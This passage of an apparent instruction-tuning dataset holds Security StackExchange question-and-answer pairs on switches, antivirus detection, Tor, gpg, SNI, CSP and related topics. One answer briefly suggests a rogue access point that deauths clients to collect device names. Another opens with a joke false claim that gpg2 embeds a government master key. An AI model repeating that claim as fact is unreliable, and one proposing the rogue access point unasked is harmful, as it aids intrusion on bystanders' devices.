    "instruction": "Please answer this question: How do I select a switch that protects against CAM attack?\nAre there any flags/attributes, that I can see when buying an ethernet switch? I mean does it has a little message on the box of the switch, or any tech specs, from where i can see that the given switch is going to survive a CAM attack?\nCAM table attack in 2011?",
    "context": "",
    "output": "For consumer-grade, off the shelf switches, you are unlikely to find port-security and/or MAC limiting features in unmanaged or 'dumb' switches.\nIf you move into the managed or 'smart' switch space, you will start to find these features. However they do come at a price, and often require some knowledge of the platform to configure. Typically these switches are used in businesses.\nCompanies like Cisco, HP and Juniper are companies who produce products which typically include these features. Each product tends to call the feature something different, so you would need to read through the spec sheet and do your research, if unfamiliar with the product or platform.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How do I select a switch that protects against CAM attack?\nAre there any flags/attributes, that I can see when buying an ethernet switch? I mean does it has a little message on the box of the switch, or any tech specs, from where i can see that the given switch is going to survive a CAM attack?\nCAM table attack in 2011?",
      "answer": "For consumer-grade, off the shelf switches, you are unlikely to find port-security and/or MAC limiting features in unmanaged or 'dumb' switches.\nIf you move into the managed or 'smart' switch space, you will start to find these features. However they do come at a price, and often require some knowledge of the platform to configure. Typically these switches are used in businesses.\nCompanies like Cisco, HP and Juniper are companies who produce products which typically include these features. Each product tends to call the feature something different, so you would need to read through the spec sheet and do your research, if unfamiliar with the product or platform."
    }
  },
  {
    "instruction": "What patterns does a signature based anti-virus look for?\nI'm working on a uni project where I will attempt to create a malware that uses some form of genetic algorithm to \"evolve\" itself out of being recognized by a signature based AV software.\nFor this I will need to code my own small AV programmed to detect the strain of malware. So my question is, what patterns do signature based AV look for?\nI can think of strings of text in the file, size of the file.",
    "context": "",
    "output": "Most antivirus solutions use a variety of techniques to identify malware.\nThe simplest (and oldest) approach is to use signatures of known malware such as MD5/SHA1 hashes, or specific strings in binaries.  This technique worked more successfully with older malware which didn't have the number of variants we see today.\nNext we have heuristic static analysis.  This works by scanning files and looking for suspicious features such as packers, obscured code, specific library imports, etc.  You could say this is the closest to the \"patterns\" you are talking about.  One could write malware and tweak it until it isn't detected by the most common malware heuristics.  These patterns and algorithms are closely guarded secrets of each antivirus vendor and they are unlikely to share them beyond generic explanations.\nThe last form of malware identification is through dynamic heuristic analysis.  This is when malware is run in a sandbox, and the antivirus looks at what the software does.  It looks at the libraries it calls, the actions it performs, whether it tries to hide itself, if it makes registry entries etc.  There are lots of ways to avoid identification through dynamic analysis which are too in depth for this answer, suffice it to say that it can by bypassed.\nTL;DR Nobody can tell you exactly what the patterns are for each antivirus program.  There are some generic things they all look for, but the specifics are secrets.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What patterns does a signature based anti-virus look for?\nI'm working on a uni project where I will attempt to create a malware that uses some form of genetic algorithm to \"evolve\" itself out of being recognized by a signature based AV software.\nFor this I will need to code my own small AV programmed to detect the strain of malware. So my question is, what patterns do signature based AV look for?\nI can think of strings of text in the file, size of the file.",
      "answer": "Most antivirus solutions use a variety of techniques to identify malware.\nThe simplest (and oldest) approach is to use signatures of known malware such as MD5/SHA1 hashes, or specific strings in binaries.  This technique worked more successfully with older malware which didn't have the number of variants we see today.\nNext we have heuristic static analysis.  This works by scanning files and looking for suspicious features such as packers, obscured code, specific library imports, etc.  You could say this is the closest to the \"patterns\" you are talking about.  One could write malware and tweak it until it isn't detected by the most common malware heuristics.  These patterns and algorithms are closely guarded secrets of each antivirus vendor and they are unlikely to share them beyond generic explanations.\nThe last form of malware identification is through dynamic heuristic analysis.  This is when malware is run in a sandbox, and the antivirus looks at what the software does.  It looks at the libraries it calls, the actions it performs, whether it tries to hide itself, if it makes registry entries etc.  There are lots of ways to avoid identification through dynamic analysis which are too in depth for this answer, suffice it to say that it can by bypassed.\nTL;DR Nobody can tell you exactly what the patterns are for each antivirus program.  There are some generic things they all look for, but the specifics are secrets."
    }
  },
  {
    "instruction": "Q: How did Google know I looked something up?\nYesterday I was searching DuckDuckGo for booking a vacation. I ended up reading a lot on one specific website. Today multiple websites show me Google banners from this specific website. Normally, I never look up websites for booking a vacation. I use DuckDuckGo on purpose, to prevent these kind of things. My question therefore is: how is this possible?\nI'm 100% certain that I didn't accidentally Google something.\nThe website I was reading was this, if that helps.",
    "context": "",
    "output": " A: It is most likely due to the website using Google tools.\nMany website uses Google analytics or advertisement service, with whom they can get information on who's visiting their website etc. \nHence, Google is informed of your visit of this website.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How did Google know I looked something up?\nYesterday I was searching DuckDuckGo for booking a vacation. I ended up reading a lot on one specific website. Today multiple websites show me Google banners from this specific website. Normally, I never look up websites for booking a vacation. I use DuckDuckGo on purpose, to prevent these kind of things. My question therefore is: how is this possible?\nI'm 100% certain that I didn't accidentally Google something.\nThe website I was reading was this, if that helps.",
      "answer": "It is most likely due to the website using Google tools.\nMany website uses Google analytics or advertisement service, with whom they can get information on who's visiting their website etc. \nHence, Google is informed of your visit of this website."
    }
  },
  {
    "instruction": "Can you tell me the answer to: How to verify .plist and .kext files are legitimate?\nWhile scouring through tons of logs generated during an audit of a Mac filesystem after a potential malware infection, and I am wondering if there are any better ways to verify that all kernel extension (.kext) and property list (.plist) files are legitimate? \nSo far, I have just been doing cat auditlog.txt | grep -v com.apple so that I'm only looking at third party extensions. This filters out the vast majority of results, leaving only the files that aren't signed by Apple, but I have a feeling there is a better method.",
    "context": "",
    "output": "answer: The only good solution for recovering from a malware infection is to wipe the disk and reinstall the OS. If you have a backup that you are confident predates the infection, you can go back to that. \nI know that you state that it's a potential malware infection, but if you have any doubts (which you obviously do as you asked this question), wipe the disk.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to verify .plist and .kext files are legitimate?\nWhile scouring through tons of logs generated during an audit of a Mac filesystem after a potential malware infection, and I am wondering if there are any better ways to verify that all kernel extension (.kext) and property list (.plist) files are legitimate? \nSo far, I have just been doing cat auditlog.txt | grep -v com.apple so that I'm only looking at third party extensions. This filters out the vast majority of results, leaving only the files that aren't signed by Apple, but I have a feeling there is a better method.",
      "answer": "The only good solution for recovering from a malware infection is to wipe the disk and reinstall the OS. If you have a backup that you are confident predates the infection, you can go back to that. \nI know that you state that it's a potential malware infection, but if you have any doubts (which you obviously do as you asked this question), wipe the disk."
    }
  },
  {
    "instruction": "How to restrict skype file transfer outside of LAN\nWe are a mobile application development company.\nDue to the security of Source Code and other files, we need to restrict Skype file transfer outside of LAN.\nHow to restrict Skype file transfer outside of LAN?",
    "context": "",
    "output": "It's exceedingly difficult to block Skype file transfers at the network level. They've designed it to use common ports (80 / 443) and proprietary encryption (albeit an extension to SSL) along with UPnP NAT holepunching to ensure absolutely minimal conflicts and setup issues. Remote file transfers go through supernodes as part of a P2P architecture, so it's not possible to blacklist a server to prevent the transfer.\nYou can disable the file transfer ability of Skype entirely, though. It's done via a registry key.\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Skype\\Phone\n\nYou may need to create this key first. Once you've found / created it, make a value called DisableFileTransfer as a DWORD and set its value to 1. This will completely disable file transfers within Skype. You may need to restart Skype or the whole computer for it to take effect.\nAfter the transfers are disabled, you can use an alternative file sharing mechanism within your LAN, such as shared drives.\nNote that you'll need to restrict access to the registry on those computers. Your users should run as limited accounts, and you should use group policy to deny access to administrative tools like regedit.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to restrict skype file transfer outside of LAN\nWe are a mobile application development company.\nDue to the security of Source Code and other files, we need to restrict Skype file transfer outside of LAN.\nHow to restrict Skype file transfer outside of LAN?",
      "answer": "It's exceedingly difficult to block Skype file transfers at the network level. They've designed it to use common ports (80 / 443) and proprietary encryption (albeit an extension to SSL) along with UPnP NAT holepunching to ensure absolutely minimal conflicts and setup issues. Remote file transfers go through supernodes as part of a P2P architecture, so it's not possible to blacklist a server to prevent the transfer.\nYou can disable the file transfer ability of Skype entirely, though. It's done via a registry key.\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Skype\\Phone\n\nYou may need to create this key first. Once you've found / created it, make a value called DisableFileTransfer as a DWORD and set its value to 1. This will completely disable file transfers within Skype. You may need to restart Skype or the whole computer for it to take effect.\nAfter the transfers are disabled, you can use an alternative file sharing mechanism within your LAN, such as shared drives.\nNote that you'll need to restrict access to the registry on those computers. Your users should run as limited accounts, and you should use group policy to deny access to administrative tools like regedit."
    }
  },
  {
    "instruction": "Answer this question:\n\nHow do I make Ghidra propagate modified functon signatures to other programs in that project?\nI have imported several programs to my Ghidra project and retyped a few function parameters in one of them.\nNow I am working on a different program, which imports these functions.\nHowever, the imported functions still have their original, unmodified signatures.\nHow do I tell Ghidra to propagate the changes?",
    "context": "",
    "output": "A: One way that should work is using the \"Capture Function Prototypes\" context menu action on the Project Datatype Archive while in the binary that defines those functions, then applying them in the binary that imports them.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How do I make Ghidra propagate modified functon signatures to other programs in that project?\nI have imported several programs to my Ghidra project and retyped a few function parameters in one of them.\nNow I am working on a different program, which imports these functions.\nHowever, the imported functions still have their original, unmodified signatures.\nHow do I tell Ghidra to propagate the changes?",
      "answer": "One way that should work is using the \"Capture Function Prototypes\" context menu action on the Project Datatype Archive while in the binary that defines those functions, then applying them in the binary that imports them."
    }
  },
  {
    "instruction": "Please answer this question: Can Avast check my WI-FI password for strength?\nI've been greeted by this popup this morning:\n\nCan Avast actually check my WI-FI password for strength? Or is it just \"marketing scare\" so that I upgrade to the paid version instead of using the free version? If it's a real notification message, how does it do that?",
    "context": "",
    "output": "Windows stores the Wi-Fi password in reversible format. A simple Google query for \"how does Windows store Wi-Fi passwords\" returns this article, which doesn't answer the question at all, but shows that Windows can at least display the original password.\nThat means that your Anti-Virus Software, which runs with elevated rights, can read out your Wi-Fi password and then run some checks against it.\nFor example, if your Wi-Fi password were zxcvbnm12345, it may detect the pattern behind and report it as weak.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Can Avast check my WI-FI password for strength?\nI've been greeted by this popup this morning:\n\nCan Avast actually check my WI-FI password for strength? Or is it just \"marketing scare\" so that I upgrade to the paid version instead of using the free version? If it's a real notification message, how does it do that?",
      "answer": "Windows stores the Wi-Fi password in reversible format. A simple Google query for \"how does Windows store Wi-Fi passwords\" returns this article, which doesn't answer the question at all, but shows that Windows can at least display the original password.\nThat means that your Anti-Virus Software, which runs with elevated rights, can read out your Wi-Fi password and then run some checks against it.\nFor example, if your Wi-Fi password were zxcvbnm12345, it may detect the pattern behind and report it as weak."
    }
  },
  {
    "instruction": "Can my workplace view my Tor traffic?\nI connect to the internet using my company's Wi-Fi and Tor. Can they still see the websites I visit?",
    "context": "",
    "output": "Generally speaking No. Assuming: \n\nYou follow Tor's best practices \n\nTor does not protect all of your computer's Internet traffic when you run it. Tor only protects your applications that are properly configured to send their Internet traffic through Tor. To avoid problems with Tor configuration, we strongly recommend you use the Tor Browser.\n\nso if it's not setup correctly things can still leak like DNS requests for example.\nYou are using a private computer (or at least one the company doesn't control). If they are admins on your computer they could install VNC or some logging software that will record your actions regardless of what software you use.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Can my workplace view my Tor traffic?\nI connect to the internet using my company's Wi-Fi and Tor. Can they still see the websites I visit?",
      "answer": "Generally speaking No. Assuming: \n\nYou follow Tor's best practices \n\nTor does not protect all of your computer's Internet traffic when you run it. Tor only protects your applications that are properly configured to send their Internet traffic through Tor. To avoid problems with Tor configuration, we strongly recommend you use the Tor Browser.\n\nso if it's not setup correctly things can still leak like DNS requests for example.\nYou are using a private computer (or at least one the company doesn't control). If they are admins on your computer they could install VNC or some logging software that will record your actions regardless of what software you use."
    }
  },
  {
    "instruction": "Can you tell me the answer to: How helpful is encrypting/decrypting information on an app-server, and sending it to the database encrypted?\nI just added some code to our app server to encrypt personal information before it's stored in the database. This was mostly done for compliance reasons, but how much of an actual security win is it?\nI hear about database dumps all the time, but I'm not clear on how the attackers usually get the database. If it's by getting to a shell and being able to run arbitrary code, it seems fairly simple to go over to the app servers to find the encryption key being used.\nI ask this because if it's a real security win, then we should probably encrypt more data before it reaches the database. On the other hand, if it's just theater, I'd rather spend our time improving security in a meaningful way.\n(This is assuming the backups for the database are themselves encrypted).",
    "context": "",
    "output": "answer: Since there's not been an answer, I'll take a shot at this... but there are other questions about Database Encryption already, so you might want to check some of them out, as well.\nAs for how Database Dumps are acquired:\n\nBackups\nSQL Injection\nOpen Ports and the related terror of Default Passwords\nProduction Snapshots used in Development or Staging\n\nWhile it's possible that an attacker could just acquire the encryption key from disk as you suggest... I cover some ways to mitigate that risk in a previous answer.\nAs for it's overall effectiveness... I wish I had some statistical resource to call on, but I don't. Intuitively, it would seem to protect your data with most static dump approaches. It increases the complexity requirement for an attacker - which is generally exactly what you want - since they will now need to breach your application layer to get the keys, in addition to the database layer.\nThe Patreon Breach is generally my favourite example of how Database Encryption helps to mitigate the fallout of a major incident.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How helpful is encrypting/decrypting information on an app-server, and sending it to the database encrypted?\nI just added some code to our app server to encrypt personal information before it's stored in the database. This was mostly done for compliance reasons, but how much of an actual security win is it?\nI hear about database dumps all the time, but I'm not clear on how the attackers usually get the database. If it's by getting to a shell and being able to run arbitrary code, it seems fairly simple to go over to the app servers to find the encryption key being used.\nI ask this because if it's a real security win, then we should probably encrypt more data before it reaches the database. On the other hand, if it's just theater, I'd rather spend our time improving security in a meaningful way.\n(This is assuming the backups for the database are themselves encrypted).",
      "answer": "Since there's not been an answer, I'll take a shot at this... but there are other questions about Database Encryption already, so you might want to check some of them out, as well.\nAs for how Database Dumps are acquired:\n\nBackups\nSQL Injection\nOpen Ports and the related terror of Default Passwords\nProduction Snapshots used in Development or Staging\n\nWhile it's possible that an attacker could just acquire the encryption key from disk as you suggest... I cover some ways to mitigate that risk in a previous answer.\nAs for it's overall effectiveness... I wish I had some statistical resource to call on, but I don't. Intuitively, it would seem to protect your data with most static dump approaches. It increases the complexity requirement for an attacker - which is generally exactly what you want - since they will now need to breach your application layer to get the keys, in addition to the database layer.\nThe Patreon Breach is generally my favourite example of how Database Encryption helps to mitigate the fallout of a major incident."
    }
  },
  {
    "instruction": "Answer this question:\n\nGet Device names of surrounding WIFI devices without authentication\nI am looking to get a list of devices which are in range of my Wifi antenne (monitor mode). \nFor example: \"Tom's Iphone\"\nI can get the MAC's of these devices, but is it possible to get the name of these devices without them actually connect to my Wifi Antenne? \nOr is this something that is not technically possible?",
    "context": "",
    "output": "A: No  this is not possible. Generally the names you\u2019re talking about come from NETBIOS, bonjour, UPnP, or some other broadcast protocol. These, however, only broadcast within their own networks so unless the device connects and then you capture a beacon you\u2019re out of luck. You could potentially build something that was an SSID of \u2018attwifi\u2019 which deauths clients after they broadcast their name if you really wanted to collect device names.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Get Device names of surrounding WIFI devices without authentication\nI am looking to get a list of devices which are in range of my Wifi antenne (monitor mode). \nFor example: \"Tom's Iphone\"\nI can get the MAC's of these devices, but is it possible to get the name of these devices without them actually connect to my Wifi Antenne? \nOr is this something that is not technically possible?",
      "answer": "No  this is not possible. Generally the names you\u2019re talking about come from NETBIOS, bonjour, UPnP, or some other broadcast protocol. These, however, only broadcast within their own networks so unless the device connects and then you capture a beacon you\u2019re out of luck. You could potentially build something that was an SSID of \u2018attwifi\u2019 which deauths clients after they broadcast their name if you really wanted to collect device names."
    }
  },
  {
    "instruction": "What is the answer to this question - gpg2 --symmetric and passphrase\nTrying to encrypt files using gpg (GnuPG) from command line, using AES256. \n To encrypt:\ngpg2 --cipher-algo AES256 --symmetric file\n\nTo decrypt:\ngpg2 --output file --decrypt file\n\nQuestion is, when encrypting, it asks for a passphrase, but when decrypting, it DOESN'T ask for a passphrase. Is it normal? Why I can decrypt without entering a passphrase?\n\n",
    "context": "",
    "output": "gpg2 always includes the encryption master key to comply with the latest DHS consumer encryption standard.\nNo, kidding, actually gpg2 always starts an \"agent\" that holds on to your passphrases for you. Do:\nkillall -w gpg-agent\n\nAnd then try to decrypt again - it should ask for the password again.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "gpg2 --symmetric and passphrase\nTrying to encrypt files using gpg (GnuPG) from command line, using AES256. \n To encrypt:\ngpg2 --cipher-algo AES256 --symmetric file\n\nTo decrypt:\ngpg2 --output file --decrypt file\n\nQuestion is, when encrypting, it asks for a passphrase, but when decrypting, it DOESN'T ask for a passphrase. Is it normal? Why I can decrypt without entering a passphrase?",
      "answer": "gpg2 always includes the encryption master key to comply with the latest DHS consumer encryption standard.\nNo, kidding, actually gpg2 always starts an \"agent\" that holds on to your passphrases for you. Do:\nkillall -w gpg-agent\n\nAnd then try to decrypt again - it should ask for the password again."
    }
  },
  {
    "instruction": "What is the answer to this question - Exposing UUID or BIGSERIAL Primary Keys\nExposing primary keys is bad practice. How should I expose UUID or BIGSERIAL Primary Keys to clients \u2014 hashing, encoding, encrypting? For integers there are libraries like hashids, what about UUID?\n\n",
    "context": "",
    "output": "UUIDs are just large integers written in a particular format. There are libraries that convert to and fro UUIDs, or you can check out answers such as this.\nOnce you have the integer, you can employ AES, or some reversible scheme such as a Feistel network or, if the user has no way of ever recovering the decrypted information, a simple XOR with a known secret.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Exposing UUID or BIGSERIAL Primary Keys\nExposing primary keys is bad practice. How should I expose UUID or BIGSERIAL Primary Keys to clients \u2014 hashing, encoding, encrypting? For integers there are libraries like hashids, what about UUID?",
      "answer": "UUIDs are just large integers written in a particular format. There are libraries that convert to and fro UUIDs, or you can check out answers such as this.\nOnce you have the integer, you can employ AES, or some reversible scheme such as a Feistel network or, if the user has no way of ever recovering the decrypted information, a simple XOR with a known secret."
    }
  },
  {
    "instruction": "Answer this question:\n\nShould I keep incoming data UDP ports open in a minimal server environment?\nI have a minimal, uncustomized Ubuntu 16.04 xenial Nginx server environment with only these incoming data TCP ports unfiltered:\n22, 80, 443, 9000\n\nWhen reviewing /etc/csf/csf.conf I found out that the following incoming data UPD ports are unfiltered:\n20, 21, 53\n\nShould I filter these 3 so no one could try to access my system through them?",
    "context": "",
    "output": "A: Are there any services listening on those UDP ports (output of netstat -lnup)? If not, then there is no risk in leaving these ports \"unfirewalled\", since the data will never reach any process.\nHowever, it is common to block inbound traffic to all unused ports so that there aren't any surprises when new processes are launched.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Should I keep incoming data UDP ports open in a minimal server environment?\nI have a minimal, uncustomized Ubuntu 16.04 xenial Nginx server environment with only these incoming data TCP ports unfiltered:\n22, 80, 443, 9000\n\nWhen reviewing /etc/csf/csf.conf I found out that the following incoming data UPD ports are unfiltered:\n20, 21, 53\n\nShould I filter these 3 so no one could try to access my system through them?",
      "answer": "Are there any services listening on those UDP ports (output of netstat -lnup)? If not, then there is no risk in leaving these ports \"unfirewalled\", since the data will never reach any process.\nHowever, it is common to block inbound traffic to all unused ports so that there aren't any surprises when new processes are launched."
    }
  },
  {
    "instruction": "Answer the following question:\n\nCan I read the domain name from HTTPS before SSL handshake?\nI am researching if I can host multiple domains on one server through HTTPS but for each domain, I have a different certificate.\nIn this case, I would need to know the domain of the incoming connection so in that first part of the SSL handshake, will it have the information I need to send back the correct certificate for that domain?",
    "context": "",
    "output": "Yes, as long as the server and the clients support the Server-Name-Indication (or SNI) extension.   This extension allows for virtual hosting for HTTPS, where you have multiple independent domains and certifications bound to a single IP address. \nMost clients these days do support SNI.  The place where you might have issues is if you have older clients using platforms like Windows XP, old versions of Android, or Java 6.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Can I read the domain name from HTTPS before SSL handshake?\nI am researching if I can host multiple domains on one server through HTTPS but for each domain, I have a different certificate.\nIn this case, I would need to know the domain of the incoming connection so in that first part of the SSL handshake, will it have the information I need to send back the correct certificate for that domain?",
      "answer": "Yes, as long as the server and the clients support the Server-Name-Indication (or SNI) extension.   This extension allows for virtual hosting for HTTPS, where you have multiple independent domains and certifications bound to a single IP address. \nMost clients these days do support SNI.  The place where you might have issues is if you have older clients using platforms like Windows XP, old versions of Android, or Java 6."
    }
  },
  {
    "instruction": "Can you tell me the answer to: Is software fuzzing safe?\nIs software fuzzing safe (Anerican fuzzy lop or AFL for example)? What's its probability of producing a random input that can make the program\n\nDelete a file or\nConnect to a random server\n\ninto a program?",
    "context": "",
    "output": "answer: There's no way to give you a probability for every program, but I can say that no it is not safe to run a fuzzer on a program with access to a filesystem that you do not want damaged. While programs that do not do any I/O at all are much less likely to delete or modify files, it is still absolutely possible. I have had data on filesystems damaged (and in one case, the filesystem itself got corrupted) as a result of fuzzing with AFL. Thankfully in my case, the program only had access to an empty partition...",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is software fuzzing safe?\nIs software fuzzing safe (Anerican fuzzy lop or AFL for example)? What's its probability of producing a random input that can make the program\n\nDelete a file or\nConnect to a random server\n\ninto a program?",
      "answer": "There's no way to give you a probability for every program, but I can say that no it is not safe to run a fuzzer on a program with access to a filesystem that you do not want damaged. While programs that do not do any I/O at all are much less likely to delete or modify files, it is still absolutely possible. I have had data on filesystems damaged (and in one case, the filesystem itself got corrupted) as a result of fuzzing with AFL. Thankfully in my case, the program only had access to an empty partition..."
    }
  },
  {
    "instruction": "What is the answer to this question - How does IDA understand that the file was packed by packer?\nSo, how does IDA understand that the file was packed by a packer?  \nHow does it distinguishes between different types of packers?  \nAre they leave some significant signatures or some patterns of byte code?\nOr maybe they do modify the header of the file in some way?\n\n",
    "context": "",
    "output": "IDA don't detect type of packer. Also, signatures are not used. Instead, it analyze PE-header: .idata section, entry point and import entries.\nThis method is very accurate, has low false positives.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How does IDA understand that the file was packed by packer?\nSo, how does IDA understand that the file was packed by a packer?  \nHow does it distinguishes between different types of packers?  \nAre they leave some significant signatures or some patterns of byte code?\nOr maybe they do modify the header of the file in some way?",
      "answer": "IDA don't detect type of packer. Also, signatures are not used. Instead, it analyze PE-header: .idata section, entry point and import entries.\nThis method is very accurate, has low false positives."
    }
  },
  {
    "instruction": "Answer the following question:\n\nHow secure is using public computer?\nI got questioned about the security of using public computers and sending data with them. I am using HTTPS which is based on SSL, while SSL uses PKI which is hard to hack. Thus, there is nothing to worry about while using a public computer. Is it right? (I don't take into account cases with computer-based viruses like Trojan)",
    "context": "",
    "output": "Not Secure At All\nHTTPS mitigates against several threats, such as:\n\nAn attacker impersonating the server you try to communicate with\nAn attacker reading your communication between you and the server\nAn attacker modifying your communication between you and the server\n\nHowever, these are all network-based attacks. On a public computer, the attacker has many ways of compromising you, (and even compromise guarantees made by HTTPS). For example, an attacker could\n\nInstall a Keylogger and wait for you to log into an account of yours\nInstall a custom Certificate Authority, allowing them to impersonate any server (e.g. Facebook, Google, etc.)\nInstall a screen recording software to spy on your private data while you view it\n\nThere are many other ways how an attacker can gain access to your data, should you choose to enter or read sensitive data on a compromised machine.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How secure is using public computer?\nI got questioned about the security of using public computers and sending data with them. I am using HTTPS which is based on SSL, while SSL uses PKI which is hard to hack. Thus, there is nothing to worry about while using a public computer. Is it right? (I don't take into account cases with computer-based viruses like Trojan)",
      "answer": "Not Secure At All\nHTTPS mitigates against several threats, such as:\n\nAn attacker impersonating the server you try to communicate with\nAn attacker reading your communication between you and the server\nAn attacker modifying your communication between you and the server\n\nHowever, these are all network-based attacks. On a public computer, the attacker has many ways of compromising you, (and even compromise guarantees made by HTTPS). For example, an attacker could\n\nInstall a Keylogger and wait for you to log into an account of yours\nInstall a custom Certificate Authority, allowing them to impersonate any server (e.g. Facebook, Google, etc.)\nInstall a screen recording software to spy on your private data while you view it\n\nThere are many other ways how an attacker can gain access to your data, should you choose to enter or read sensitive data on a compromised machine."
    }
  },
  {
    "instruction": "Question: Plausible deniability with TrueCrypt\nIf I have a TrueCrypt container with a capacity of 2 GB which I use to fill 1 GB with real, hidden data, and leave the other GB for decoy data, then if I need to reveal a password and give out the decoy password, can't the attacker simply fill the container with junk until it's full, then compare the full size with the total container size and determine that if the full size is smaller than the container size, then it must have hidden data?",
    "context": "",
    "output": "Answer: No, but it will overwrite your hidden volume.\nThe hidden OS doesn't signal to the \"primary\" OS that there is any hidden volume. Instead it just looks like blank, free space available for the taking. A FAT filesystem won't use space at the end of the drive until it needs to, but if it gets to that, it will.\nSo you still have plausible deniability, but your encrypted volume is now completely overwritten.\nAw well.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Plausible deniability with TrueCrypt\nIf I have a TrueCrypt container with a capacity of 2 GB which I use to fill 1 GB with real, hidden data, and leave the other GB for decoy data, then if I need to reveal a password and give out the decoy password, can't the attacker simply fill the container with junk until it's full, then compare the full size with the total container size and determine that if the full size is smaller than the container size, then it must have hidden data?",
      "answer": "No, but it will overwrite your hidden volume.\nThe hidden OS doesn't signal to the \"primary\" OS that there is any hidden volume. Instead it just looks like blank, free space available for the taking. A FAT filesystem won't use space at the end of the drive until it needs to, but if it gets to that, it will.\nSo you still have plausible deniability, but your encrypted volume is now completely overwritten.\nAw well."
    }
  },
  {
    "instruction": "Answer this question:\n\nHow should I select which antivirus software to install on my new laptop?\nI'm in a bit of a dilemma here. I have bought a new laptop with no antivirus installed. I'm wondering how to choose an appropriate antivirus software to install.",
    "context": "",
    "output": "A: Measuring real-world antivirus performance is difficult to do because malware risk is hard to quantify. \nAV-Comparatives and AV-Test are two independent Antivirus testing organizations. They perform periodic tests from multiple features such as detection, performance, enterprise functionality, etc.\nHere is a summary report of AV performance for 2012 split into categories so you can chose what is best suited for you. \nFree AVs are good choices too because they provide all the basic features and the same signature database as the premium version. They lack extra features such as SPAM and phishing protection, firewall or parental controls.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How should I select which antivirus software to install on my new laptop?\nI'm in a bit of a dilemma here. I have bought a new laptop with no antivirus installed. I'm wondering how to choose an appropriate antivirus software to install.",
      "answer": "Measuring real-world antivirus performance is difficult to do because malware risk is hard to quantify. \nAV-Comparatives and AV-Test are two independent Antivirus testing organizations. They perform periodic tests from multiple features such as detection, performance, enterprise functionality, etc.\nHere is a summary report of AV performance for 2012 split into categories so you can chose what is best suited for you. \nFree AVs are good choices too because they provide all the basic features and the same signature database as the premium version. They lack extra features such as SPAM and phishing protection, firewall or parental controls."
    }
  },
  {
    "instruction": "Answer the following question:\n\nHow does a hacker get access to my files if he got access to another user's files on a shared server?\nI host files on a shared server with Ubuntu 14.04. How does a hacker get access to my files if he got access to another user's files and how do I prevent it?",
    "context": "",
    "output": "It's all about privileges.\nNo matter what operating system you are refering to. The way to access a certain file path on a server is through privileges assigned to server users.\nA user can share access privileges with other users to access certain files, but if an user doesn't have privileges to access that path, he can reach privileges by a technique called privilege scalation exploiting server's vulnerabilities, giving him or her access to routes that are not authorized for that user.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How does a hacker get access to my files if he got access to another user's files on a shared server?\nI host files on a shared server with Ubuntu 14.04. How does a hacker get access to my files if he got access to another user's files and how do I prevent it?",
      "answer": "It's all about privileges.\nNo matter what operating system you are refering to. The way to access a certain file path on a server is through privileges assigned to server users.\nA user can share access privileges with other users to access certain files, but if an user doesn't have privileges to access that path, he can reach privileges by a technique called privilege scalation exploiting server's vulnerabilities, giving him or her access to routes that are not authorized for that user."
    }
  },
  {
    "instruction": "Can you tell me the answer to: What is the behaviour of CSP if default-src not specified?\nBasically all in the title.\nImagine a simple CSP like\nContent-Security-Policy: script-src 'self'\n\nWhat is the behaviour of directives that would normally fall back to default-src which are not specified such as img-src or frame-src? Will they default to open (allow everything) or default to closed (allow nothing)?\nUnless I'm missing it, neither\n\nthe Mozilla CSP docs, and\ncontent-security-policy.com\n\nspecify the behaviour if directives are missing.",
    "context": "",
    "output": "answer: If no CSP is specified for a directive, it falls back to default-src.\nIf there is no default-src CSP, it does not fall back on any directive and thus it allows everything.\nI have searched the RFC about it and I could hardly find anything to quote that would push my statement. However, this is implied multiple times.\n\nTo enforce a policy, the user agent MUST parse the policy and enforce\neach of the directives contained in the policy\n\ndefault-src is a directive by itself. Thus, it WILL enforce default-src which actions is to set the default value for all others directive. If default-src the browser does not have to enforce any default restriction for other directives.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What is the behaviour of CSP if default-src not specified?\nBasically all in the title.\nImagine a simple CSP like\nContent-Security-Policy: script-src 'self'\n\nWhat is the behaviour of directives that would normally fall back to default-src which are not specified such as img-src or frame-src? Will they default to open (allow everything) or default to closed (allow nothing)?\nUnless I'm missing it, neither\n\nthe Mozilla CSP docs, and\ncontent-security-policy.com\n\nspecify the behaviour if directives are missing.",
